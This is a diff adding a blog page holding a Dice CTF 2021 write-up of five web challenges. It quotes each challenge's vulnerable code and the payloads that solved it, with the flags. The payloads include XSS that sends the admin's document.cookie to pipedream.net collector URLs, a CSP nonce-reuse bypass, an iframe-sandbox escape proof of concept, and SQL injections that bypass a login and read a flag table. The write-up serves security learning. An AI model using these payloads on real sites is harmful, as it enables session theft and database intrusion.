@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Dice CTF 2021 Write Up :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This article is about write-up for the Dice CTF 2021 . there is only four web challenges, which contain XSS and SQL Injection bug" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://example.org/posts/2021-02-08-dice-ctf/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://example.org/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://example.org/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="https://example.org/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Dice CTF 2021 Write Up">
+<meta property="og:description" content="This article is about write-up for the Dice CTF 2021 . there is only four web challenges, which contain XSS and SQL Injection bug" />
+<meta property="og:url" content="https://example.org/posts/2021-02-08-dice-ctf/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  
+    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2021-02-08 23:29:53 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://example.org/">
+  <div class="logo">
+    re-Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://example.org/posts/2021-02-08-dice-ctf/">Dice CTF 2021 Write Up</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2021-02-08</time>
+    
+</div>
+
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true" alt=""></p>
+<hr>
+<h1 id="web-babier-csp-107-pts">(Web) Babier CSP [107 pts]<a href="#web-babier-csp-107-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Babier CSP challenge is a simple CSP Bypass challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">LRGWAXOY98Es0zz0QOVmag==</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elem</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/?name=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent([<span style="color:#e6db74">&#34;apple&#34;</span>, <span style="color:#e6db74">&#34;orange&#34;</span>, <span style="color:#e6db74">&#34;pineapple&#34;</span>, <span style="color:#e6db74">&#34;pear&#34;</span>][Math.<span style="color:#a6e22e">floor</span>(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> Math.<span style="color:#a6e22e">random</span>())]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">LRGWAXOY98Es0zz0QOVmag==</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">LRGWAXOY98Es0zz0QOVmag==</span>&gt;<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#34;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">bdocument</span>.<span style="color:#a6e22e">cookie</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>The payload used is as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}
+</span></span></code></pre></div><hr>
+<h1 id="web-missing-flavortext-111-pts">(Web) Missing Flavortext [111 pts]<a href="#web-missing-flavortext-111-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ([<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>].<span style="color:#a6e22e">some</span>(<span style="color:#a6e22e">v</span> =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>))) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>username=admin&amp;password[]=1&amp;password[]=&#39; or &#39;1&#39;=&#39;1
+</span></span><span style="display:flex;"><span>The payload used is as above.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
+</span></span></code></pre></div><hr>
+<h1 id="web-web-utils-121-pts">(Web) Web Utils [121 pts]<a href="#web-web-utils-121-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>// view.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">async</span>&gt;
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">pathname</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">id</span>) window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">origin</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span>window.<span style="color:#a6e22e">origin</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/api/data/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">type</span> } <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">type</span> ) window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">origin</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;link&#39;</span>) <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;complete&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">r</span>) =&gt; { window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, <span style="color:#a6e22e">r</span>); });
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Paste&#39;</span>;
+</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;div&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>    })()
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span></code></pre></div><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as javascript:alert(1), you can trigger xss.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// api.js
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>(<span style="color:#a6e22e">skip</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">fastify</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fastify</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;createLink&#39;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">handler</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">rep</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">generateUid</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#e6db74">&#39;^https?://&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">data</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rep</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">skip</span>)
+</span></span></code></pre></div><p>However, if you look at the link creation logic, the value of req.body.data is verified with a regular expression. So, you can’t put xss payload in the link creation logic.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// api.js
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>(<span style="color:#a6e22e">skip</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fastify</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;createPaste&#39;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">handler</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">rep</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">generateUid</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">addData</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;paste&#39;</span>, ...<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">uid</span> });
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">rep</span>
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">code</span>(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">skip</span>)
+</span></span></code></pre></div><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>{&#34;data&#34;:&#34;javascript:alert(1)&#34;,&#34;type&#34;:&#34;link&#34;}
+</span></span><span style="display:flex;"><span>{&#34;data&#34;:&#34;javascript:location.href=&#39;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&#39;%2bdocument.cookie&#34;,&#34;type&#34;:&#34;link&#34;}
+</span></span></code></pre></div><p>The payload used is as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}
+</span></span></code></pre></div><hr>
+<h3 id="web-build-a-panel-130-pts">(Web) Build a Panel [130 pts]<a href="#web-build-a-panel-130-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/debug/add_widget&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">secret_token</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;panelid&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetname&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetdata&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;something went wrong&#39;</span>);
+</span></span><span style="display:flex;"><span>            }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;success!&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.</p>
+<p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains FLAG. (panelid is stored in a cookie.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=pocas&amp;widgetname=adfdaf&amp;widgetdata=a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;{&#34;type&#34;:&#34;pocas&#34;}&#39;)--
+</span></span></code></pre></div><p>The payload used is as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}
+</span></span></code></pre></div><hr>
+<h1 id="web-web-ide-196-pts">(Web) Web IDE [196 pts]<a href="#web-web-ide-196-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p>
+<ul>
+<li>Scenario
+<ul>
+<li>We are using allow-scripts as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li>
+<li>The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li>
+<li>So, first you need to create a separate site and bypass the iframe sandbox.</li>
+<li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li>
+<li>However, since xss payload is executed in /sandbox.html, it cannot read the admin cookie.</li>
+<li>So, create an object using window.open(&quot;/ide&quot;), and execute xss payload on the object to steal the cookie.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;xss poc&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendMessage</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// window open -&gt; make file -&gt; include it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[].constructor.constructor(\&#34;(async () =&gt; {const res = await fetch(&#39;https://web-ide.dicec.tf/ide/save&#39;, {method:&#39;POST&#39;, headers: {&#39;Content-Type&#39;: &#39;application/javascript&#39;}, body: &#39;const myWindow = window.open(\\\&#34;/ide\\\&#34;); (async (myWindow) =&gt; { await setTimeout( async() =&gt; {await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=${myWindow.document.cookie}`)}, 500) })(myWindow)&#39;}); const file_name = await res.text(); const scr = document.createElement(&#39;script&#39;); scr.src = `/ide/saves/${file_name}`; document.body.appendChild(scr);})()\&#34;)()&#34;</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">r</span>) =&gt; { window.<span style="color:#a6e22e">addEventListener</span>((<span style="color:#e6db74">&#39;load&#39;</span>), <span style="color:#a6e22e">r</span>); });
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>)
+</span></span><span style="display:flex;"><span>              .<span style="color:#a6e22e">contentWindow</span>
+</span></span><span style="display:flex;"><span>              .<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#e6db74">&#39;*&#39;</span>);  <span style="color:#75715e">// IDE -&gt; sandbox message
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        };
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sendMessage()&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hh&#39;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web-ide.dicec.tf/sandbox.html&#34;</span> <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The payload used is as above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG :dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}
+</span></span></code></pre></div>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
